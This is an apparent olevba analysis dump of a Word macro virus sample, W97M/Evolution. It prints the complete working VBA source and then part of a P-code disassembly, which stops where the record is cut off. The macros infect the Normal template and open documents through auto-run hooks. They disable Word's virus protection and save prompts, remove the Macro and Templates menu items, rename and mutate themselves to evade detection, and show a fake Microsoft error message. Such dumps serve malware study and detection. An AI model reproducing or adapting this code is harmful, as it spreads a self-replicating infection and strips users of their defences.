olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Evolution.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Evolution.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO EVOLA.bas 
in file: ./Virus.MSWord.Evolution.c - OLE stream: 'Macros/VBA/EVOLA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Source As String
Public ByeMacro As String
Public Hostinf As Boolean
Public FileInf As Boolean
Public FExport As String
Public PMExport As String
Public PMFile_Yes As Boolean
Public Ex_Yes As Boolean
Public Filename As String
Public FileID As String
Public FileID2 As String
Public Virname As String
Public FC_There As Boolean
Public FO_There As Boolean
Public FP_There As Boolean
Public FN_There As Boolean
Public FS_There As Boolean
Public FSA_There As Boolean
Public VrusName As String
Public Armor As Boolean
Function Self_Recognition()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
newname:
Close #1
Open "C:\windows\system\vnames.cpl" For Append As #1
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
      Close #1
        End If
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
lost:
Next Z
Loop Until EOF(1)
Close #1
Dim Lib
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
skip:
Next Lib
Loop Until EOF(1)
doccheck:
Close #1
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
nope:
Next Lib
Loop Until EOF(1)
FileInf = False
leave:
Close #1
End Function
Function Armor_Status()
Application.EnableCancelKey = wdCancelDisabled
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
Offense:
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
Armor = False
End Function
Function Export_Code()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
FExport = Dir("C:\windows\system\export.sys")
If FExport = "Export.sys" Then Ex_Yes = True
If Ex_Yes = False Then GoTo Morph Else GoTo Recognize
Morph:
Randomize Timer
q = Int(Rnd(1) * 5) + 1
For vi = 1 To q
x = Int(Rnd(1) * 26)
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
Filename = Filename + a$
Next vi
x = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & x & ".cpl"
' RAPE v1.1 Export File ID Morph
Open "C:\windows\system\Export.sys" For Append As #1
Print #1, FileID
Close #1
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\vnames.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
Close #1
nex:
Next x
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
If CheckMe = "PMF1199.cpl" Then GoTo nextt
Do
On Error Resume Next
Open "C:\windows\system\vnames.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
nextt:
Exit Function
Recognize:
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID
Close #1
CheckMe = Dir("C:\windows\system\PMF1199.cpl")
If CheckMe = "PMF1199.cpl" Then GoTo tryharder
Do
On Error Resume Next
Open "C:\windows\system\vnames.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).export FileID
ActiveDocument.VBProject.VBComponents(Virname).export FileID
Loop Until EOF(1)
tryharder:
End Function
Function Polymorphic_Check()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open FileID2 For Input As #1
Dim FC_Check
Do
    Line Input #1, FC_Check
    If FC_Check = "Sub FileClose()" Then FC_There = True: GoTo FO_Look
Loop Until EOF(1)
FO_Look:
Dim FO_Check
Do
    Line Input #1, FO_Check
    If FO_Check = "Sub FileOpen()" Then FO_There = True: GoTo FP_Look
Loop Until EOF(1)
FP_Look:
Dim FP_Check
Do
    Line Input #1, FP_Check
    If FP_Check = "Sub FilePrint()" Then FP_There = True: GoTo FN_Look
Loop Until EOF(1)
FN_Look:
Dim FN_Check
Do
    Line Input #1, FN_Check
    If FN_Check = "Sub FileNew()" Then FN_There = True: GoTo FS_Look
Loop Until EOF(1)
FS_Look:
Dim FS_Check
Do
    Line Input #1, FS_Check
    If FS_Check = "Sub FileSave()" Then FS_There = True: GoTo FSA_Look
Loop Until EOF(1)
FSA_Look:
Dim FSA_Check
Do
    Line Input #1, FSA_Check
    If FSA_Check = "Sub FileSaveAs()" Then FSA_There = True: Exit Function
Loop Until EOF(1)
End Function
Function Evolve()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
'RAPE v1.1 Macro Virus Command/Code Editor - adds 1 to 6 Commands (subs)
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
PM = Int(Rnd(1) * 150) + 1
If PM = 22 Then
If FC_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileClose()"
Print #1, "On error resume next"
Print #1, "Call Evolution"
Print #1, "Wordbasic.FileSave"
Print #1, "End Sub"
Close #1
End If
If PM = 73 Then
If FO_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileOpen()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileOpen)"
Print #1, "Call Evolution"
Print #1, "end sub"
Close #1
End If
If PM = 69 Then
If FP_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FilePrint()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFilePrint)"
Print #1, "Call Evolution"
Print #1, "End sub"
Close #1
End If
If PM = 122 Then
If FN_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileNew()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileNew)"
Print #1, "Call Evolution"
Print #1, "End Sub"
Close #1
End If
If PM = 90 Then
If FS_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileSave()"
Print #1, "on error resume next"
Print #1, "call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
If PM = 8 Then
If FSA_There = True Then Exit Function
Open FileID2 For Append As #1
Print #1, "Sub FileSaveAs()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileSaveAs)"
Print #1, "Call Evolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
End Function
Function Norminf()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
        Open "C:\windows\system\vnames.cpl" For Append As #1
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
        Close #1
        End If
nexus:
    Next l
With NormalTemplate.VBProject.VBComponents.Import(FileID2)
End With
MsgBox "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists, please contact Microsoft Technical Support.", 48
End Function
Function FileInft()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Export.sys" For Input As #1
Line Input #1, FileID2
Close #1
With ActiveDocument.VBProject.VBComponents.Import(FileID2)
End With
Randomize Timer
WD = Int(Rnd(1) * 8) + 2
For evo = 2 To WD
x = Int(Rnd(1) * 26)
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
VrusName = VrusName + a$
Next evo
Open "C:\windows\system\vnames.cpl" For Input As #1
Do
Line Input #1, Virname
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
' RAPE v1.1 Macro Virus Name Randomizer - 2 to 8 letters
Loop Until EOF(1)
Close #1
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\vnames.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
Close #1
nex:
Next x
End Function
Function Evolution()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Self_Recognition
Call Armor_Status
Call Export_Code
Call Polymorphic_Check
Call Evolve
If Hostinf = False Then Call Norminf
If FileInf = False Then Call FileInft
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
' W97M/Evolution
' W97M/Evolution .a Variant by Nex and Error
' Polymorphic Stealth Word97 Macro Virus
' All Things Must Change...
' Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error
' RAPE v1.1 does:
' Randomly Morphs Source Code by Adding Random Remarks
' Randomly Selects Source Code Export File - Then Morphs it
' Randomly Creates Virus Macro Name
' Randomly Adds 1 to 6 Commands to Code
End Function
Sub AutoClose()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
WordBasic.filesave
End Sub
Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Armor_Status
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
End Sub
Sub AutoExit()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
PMExport = Dir("C:\Windows\System\PMF1199.cpl")
If PMExport = "PMF1199.cpl" Then PMFile_Yes = True
If PMFile_Yes = True Then Exit Sub
Open "C:\Windows\System\PMF1199.cpl" For Append As #1
Print #1, "W97M/Evolution .a by Nex"
Print #1, "Random Arithmetic Polymorphic Engine (RAPE v1.1) by Error"
Close #1
Open "C:\windows\system\Export.sys" For Input As #2
Line Input #2, FileID
Close #2
Open FileID For Append As #9
Print #9, "' EOF"
Close #9
Open FileID For Input As #3
Randomize Timer
W = Int(Rnd(1) * 5) + 1
For vir = 1 To W
x = Int(Rnd(1) * 26)
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
Filename = Filename + a$
Next vir
f = Int(Rnd(1) * 999) + 1
FileID2 = "C:\windows\system\" & Filename & f & ".cpl"
Open FileID2 For Append As #4
Do
inpux:
Line Input #3, stuff
Print #4, stuff
    Randomize Timer
    t = Int(Rnd(1) * 5) + 1
    If t = 1 Then Z$ = " '" & Application.UserName
    If t = 2 Then Z$ = " '" & Application.UserInitials
    If t = 3 Then Z$ = " '" & Application.UserAddress
    If t >= 4 Then GoTo inpux
    Print #4, Z$
' Source Code Morpher - adds random remarks to Code (RAPE v1.1 by Error)
Loop Until stuff = "' EOF"
Close #3
Close #4
Kill "C:\windows\system\export.sys"
Open "C:\windows\system\Export.sys" For Append As #5
Print #5, FileID2
Close #5
End Sub
Sub AutoNew()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
End Sub
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Evolution
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub ToolsCustomize()
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
End Sub
' "The most polymorphic Macro Virus to date...." - NAI
' EOF

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Evolution.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6775 bytes
' Macros/VBA/EVOLA - 25117 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn Source (As String)
' Line #1:
' 	Dim (Public) 
' 	VarDefn ByeMacro (As String)
' Line #2:
' 	Dim (Public) 
' 	VarDefn Hostinf (As Boolean)
' Line #3:
' 	Dim (Public) 
' 	VarDefn FileInf (As Boolean)
' Line #4:
' 	Dim (Public) 
' 	VarDefn FExport (As String)
' Line #5:
' 	Dim (Public) 
' 	VarDefn PMExport (As String)
' Line #6:
' 	Dim (Public) 
' 	VarDefn PMFile_Yes (As Boolean)
' Line #7:
' 	Dim (Public) 
' 	VarDefn Ex_Yes (As Boolean)
' Line #8:
' 	Dim (Public) 
' 	VarDefn Filename (As String)
' Line #9:
' 	Dim (Public) 
' 	VarDefn FileID (As String)
' Line #10:
' 	Dim (Public) 
' 	VarDefn FileID2 (As String)
' Line #11:
' 	Dim (Public) 
' 	VarDefn Virname (As String)
' Line #12:
' 	Dim (Public) 
' 	VarDefn FC_There (As Boolean)
' Line #13:
' 	Dim (Public) 
' 	VarDefn FO_There (As Boolean)
' Line #14:
' 	Dim (Public) 
' 	VarDefn FP_There (As Boolean)
' Line #15:
' 	Dim (Public) 
' 	VarDefn FN_There (As Boolean)
' Line #16:
' 	Dim (Public) 
' 	VarDefn FS_There (As Boolean)
' Line #17:
' 	Dim (Public) 
' 	VarDefn FSA_There (As Boolean)
' Line #18:
' 	Dim (Public) 
' 	VarDefn VrusName (As String)
' Line #19:
' 	Dim (Public) 
' 	VarDefn Armor (As Boolean)
' Line #20:
' 	FuncDefn (Function Self_Recognition())
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #23:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #24:
' 	Do 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #26:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #27:
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #28:
' 	Ld Virname 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo lost 
' 	EndIf 
' Line #29:
' 	Ld Virname 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo newname 
' 	EndIf 
' Line #30:
' 	Label newname 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #32:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo lost 
' 	EndIf 
' Line #37:
' 	Label lost 
' Line #38:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #41:
' 	Dim 
' 	VarDefn Let
' Line #42:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #43:
' 	Do 
' Line #44:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #45:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #46:
' 	Ld Let 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo skip 
' 	EndIf 
' Line #47:
' 	Ld Let 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Hostinf 
' 	BoS 0x0000 
' 	GoTo doccheck 
' 	EndIf 
' Line #48:
' 	Label skip 
' Line #49:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #51:
' 	Label doccheck 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #53:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #54:
' 	Do 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #56:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #57:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nope 
' 	EndIf 
' Line #58:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FileInf 
' 	BoS 0x0000 
' 	GoTo leave 
' 	EndIf 
' Line #59:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St FileInf 
' 	BoS 0x0000 
' 	EndIf 
' Line #60:
' 	Label nope 
' Line #61:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #63:
' 	LitVarSpecial (False)
' 	St FileInf 
' Line #64:
' 	Label leave 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #66:
' 	EndFunc 
' Line #67:
' 	FuncDefn (Function Armor_Status())
' Line #68:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #69:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Armor 
' 	EndIf 
' Line #70:
' 	Label Offense 
' Line #71:
' 	Ld Armor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #72:
' 	LitVarSpecial (False)
' 	St Armor 
' Line #73:
' 	EndFunc 
' Line #74:
' 	FuncDefn (Function Export_Code())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #77:
' 	LitStr 0x001C "C:\windows\system\export.sys"
' 	ArgsLd Dir 0x0001 
' 	St FExport 
' Line #78:
' 	Ld FExport 
' 	LitStr 0x000A "Export.sys"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Ex_Yes 
' 	EndIf 
' Line #79:
' 	Ld Ex_Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Morph 
' 	Else 
' 	BoSImplicit 
' 	GoTo Recognize 
' 	EndIf 
' Line #80:
' 	Label Morph 
' Line #81:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #82:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St q 
' Line #83:
' 	StartForVariable 
' 	Ld vi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld q 
' 	For 
' Line #84:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #85:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #86:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #87:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #88:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #89:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #90:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #91:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #92:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #93:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #94:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #95:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #96:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #97:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #98:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #99:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #100:
' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #101:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #102:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #103:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #104:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #105:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #106:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #107:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #108:
' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
